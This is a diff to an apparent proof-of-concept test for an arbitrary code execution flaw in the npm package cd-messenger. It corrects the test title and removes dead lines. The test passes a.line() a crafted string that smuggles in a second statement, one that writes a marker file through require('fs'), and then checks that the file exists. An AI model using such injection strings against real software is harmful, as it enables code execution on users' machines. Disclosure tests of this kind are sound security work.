@@ -2,12 +2,11 @@
 // var a = require("cd-messenger");
 // a.line("green(); console.log('JHU'); //")
 
-test("Arbitrary code executionw cd-messenger", () => 
+test("Arbitrary code execution in cd-messenger", () => 
 {
 	const fs = require("fs");
 	const a = require("cd-messenger");
     const path = './cd-messenger';
-    let statements = '`red(); require(`fs`).writeFileSync(`' + path +'`,``);//';
     let payload = "red(); require('fs').writeFileSync('" + path + "',``); //";
 	data = {};    
 	
@@ -17,8 +16,6 @@ test("Arbitrary code executionw cd-messenger", () =>
     
 	try {
 		a.line(payload)
-		// fs.writeFileSync(./cd-messenger);
-		// a.encode(statements, data);
 	} catch(error) {}
 		
 	//checking that its created by after exploit.
